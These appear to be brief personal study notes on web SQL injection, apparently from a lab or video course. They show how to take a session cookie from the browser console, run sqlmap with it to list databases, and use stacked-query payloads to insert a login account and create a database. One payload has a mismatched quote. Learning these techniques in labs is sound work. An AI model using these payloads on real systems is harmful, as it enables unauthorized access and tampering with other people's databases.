Tools 
1) N staltker web vuln analysis
2) In the vuln web app go to console type document.cookie
	1) get the cookie value
	2) `sqlmap -u "http://IP?id=?" --cookie="X" --dbs`
to insert a username into the database we can user
`blah;insert into login values ('john',apple123');--`

then login using john as user  and apple123 as pass


To create a database 
`blah;create database mydatabase;--`  


https://www.youtube.com/watch?v=-8nysmKSgJk&list=PLrrgFyE6PtlaCixUxJPM0Y9Peye6iCewH&index=9

https://www.youtube.com/watch?v=iD84waJKYh0


